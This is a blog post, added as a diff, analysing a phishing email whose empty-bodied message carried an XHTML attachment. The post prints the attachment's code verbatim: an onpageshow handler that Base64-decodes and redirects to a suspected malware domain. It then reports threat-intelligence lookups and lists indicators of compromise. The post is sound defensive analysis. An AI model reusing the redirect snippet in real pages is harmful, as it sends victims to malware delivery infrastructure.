@@ -1,0 +1,125 @@
+---
+layout: post
+title:  "Phishing Email 20201019-001"
+date:   2022-04-26 20:52:47 -0400
+categories: phishing analysis
+---
+A while back I received a curious email and immediately thought that it was a good candidate for a little bit of analysis. It had a nonsensical subject line and what appeared to be a Russian filename. The body of the email was empty. And for all of that, it somehow managed to miss my GMail's spam filter and land directly in my inbox flagged as Important. However, I had just started a new job and was a little swamped in learning some new tools. So, I saved a copy of the email and its attachment with the intent on coming back to dig into it at a later date.
+
+That later date turned out to be six months in the future.
+
+But, stale as the suspicious email was, I decided to crack it open and find out what it was all about anyway. It was just too enticing to leave unexplored forever. I'm glad I did! Even though the email was old enough for its original attack infrastructure to have evaporated, it still held some interesting little insights into the email's original purpose.
+
+### Primary Analysis
+
+When approaching a potentially suspicious email, I like to start with the email itself and determine any indicators or behaviors that can be determined without touching any external systems.
+
+I'll start with the email's details:
+
+```
+To: [redacted]
+From: Katrice Dorrell <katricedorrell[@]gmail.com>
+Subject Z XJ O ZX
+Attachment: Играть E D Y .xhtml
+Body: [EMPTY]
+```
+
+Looking first at the recipients (redacted in this report) reveals some commonalities, but not much. The email included 11 recipients all in the TO line all of which were GMail addresses. That's pretty much where all of the commonalities ended. A few quick searches in Have I Been Pwned revealed that two of the accounts appeared in the Exploit.in collection and two were in Collection #1. It's possible that all of the addresses appeared in a common undisclosed breach, but who's to say? At any rate, there's not a whole lot that can be gleaned from the targets.
+
+Turning to the sender, it's another GMail account, which makes most of the other email header information not super useful for attribution. Searching for the sender email in google didn't turn up any information and neither did searching for Katrice Dorrell in a wide range of social media sites. It's likely, then, that this email address was genned up for this particular phishing operation. Suffice to say, it's probably another dead end.
+
+As for the email's subject, it seems fairly random to me, but just to be sure I ran it through some search engines to see if anything came up. The only thing of interest was that Google auto-corrected ZXJOZX to XBox.
+
+Since the email's body is empty, the only primary place to analyze is the attachment.
+
+Luckily, the file is a simple HTML file, meaning I can safely open it up in a plain text editor with no need to muck around with more advanced forensic tools.
+
+First, I'm curious if the file name means anything interesting. According to online translators, "Играть" is Russian for "Play." Maybe that's related to the potential XBox connection above?
+
+Looking inside the file, I found a very short HTML document:
+
+{% highlight html %}
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<body onpageshow="document.location.replace(window.atob('aHR0cDovL2tlaXRhcm8wMDAxLnByby9EY0x0ZFM/MTE3MDIxNDg4ODc3NzI0NSA='));">
+{% endhighlight %}
+
+The header is pretty standard boilerplate, but the JavaScript in the document body immediately caught my attention. It starts with an `onpageshow` assignment, which is a way to execute a Javascript function when a pageload event happens on the document. This in turn triggers a function call:
+
+{% highlight javascript %}
+document.location.replace(window.atob('aHR0cDovL2tlaXRhcm8wMDAxLnByby9EY0x0ZFM/MTE3MDIxNDg4ODc3NzI0NSA='));
+{% endhighlight %}
+
+The `location.replace()` Javascript function replaces the content of the HTML document with the document located at another URL. In this case, the argument is another function, `window.atob()`, which decodes a Base64 string into standard text.
+
+Decoding the argument to that function yields the following URL:
+http[://]keitaro0001[.]pro/DcLtdS?1170214888777245
+
+Now we're getting phishy! I was pretty convinced at this point that I had a malicious payload on my hands. But, since the file didn't contain anything executable other than the above Javascript, any more intelligence would have to be gathered from outside sources.
+
+## Secondary Research
+
+Moving on to secondary sources, I turned to urlscan.io to see if I could get any information about the URL itself. Urlscan is a tool that will scan a web page and provide information such as its IP address, screenshots of the rendered page, and other stats about the site's behavior.
+
+The initial scan didn't turn up a whole lot of information. As I mentioned above, this is a rather old email in the world of phishing campaigns, and it's unlikely that much of the original attack infrastructure was still standing. At the time that I scanned it, the domain resolved to a U.S. based IP address, and the URL was returning a Namecheap splash page indicating that the domain had been suspended due to issues with its whois verification. For those unfamiliar, whois data is information about the person or organization that registered a domain name. In this case, the whois verification issue reinforces the hypothesis that this was at some point a malicious site.
+
+The only other interesting piece of information is that urlscan.io showed that this particular domain had appeared in 31 scans. I clearly wasn't the only person interested in it!
+
+My scan was the 32nd one performed for the domain keitaro0001[.]pro, which provided another avenue to explore. Reviewing those scans I found that the majority of them had been performed six months ago, right around the time that I received the email. Which means it was probably a wide cast but short lived campaign. This is right in line with what I would expect, though. Among the previous scans, there were 6 different IP addresses, most of which were located in Russia and owned by various Russian hosting services. Using Shodan, which performs periodic scans of public IP addresses across the Internet to determine what services they are currently running, showed that only one of the IP addresses in question was currently running a Web server.
+
+While the attach infrastruture was no longer around for analysis, the historical data from Urlscan.io does tell a story. The domain in question appears to have bounced between several Russian-based IP addresses belonging to several different hosting providers over a short period of time before the domain itself was taken offline by the registrar, possibly due to evidence of malicious activity.
+
+There's one final place I went to in my investigation into this email. To see if the domain had any association with any known malware, I did a search in VirusTotal. Sure enough, four of VirusTotal's malware detection engines reported the domain as suspicious. Additionally, VirusTotal observed a file identified as a generic Trojan agent communicating with the domain. While there isn't much to indicate which Trojan variant this was, it's likely that the program would have attempted to perform some sort of exploitation and deploy additional malware if I had actually loaded it onto my computer.
+
+## Conclusion
+
+Despite the trail being cold, there is still very clear evidence that this email contained a malicious payload that could have potentially severely compromised my computer. Given how unusual the email was, I'm not sure how many people would have fallen for it, but then again phishing is a numbers game. If even just a fraction of a percent of targets download and open the malicious attachment, that can still translate to hundreds of thousands of machines if the distribution is wide enough.
+
+## Primary Artifacts
+
+### Email Addresses
+```
+katricedorrell[@]gmail.com
+```
+
+### File Names
+```
+Играть E D Y .xhtml
+```
+
+### URLs
+```
+http[://]keitaro0001[.]pro/DcLtdS?1170214888777245
+```
+
+### Domains
+```
+keitaro0001[.]pro/
+```
+
+## Secondary Artifacts
+
+### IP Addresses
+```
+31[.]41[.]46[.]64
+194[.]48[.]155[.]110
+185[.]185[.]68[.]131
+185[.]251[.]91[.]65
+178[.]208[.]75[.]4
+46[.]8[.]158[.]193
+```
+
+### Malware Signatures
+```
+TROJAN.AGENT.FOHY
+```
+
+### File Names
+```
+ПРИВАТНО OPLF181.aipahHZTD .rar
+```
+
+### Hashes
+```
+de6da06bd31ff942041de115d7134b92e6bd1fbca99412548a264e316b19cc84 (SHA256)
+```
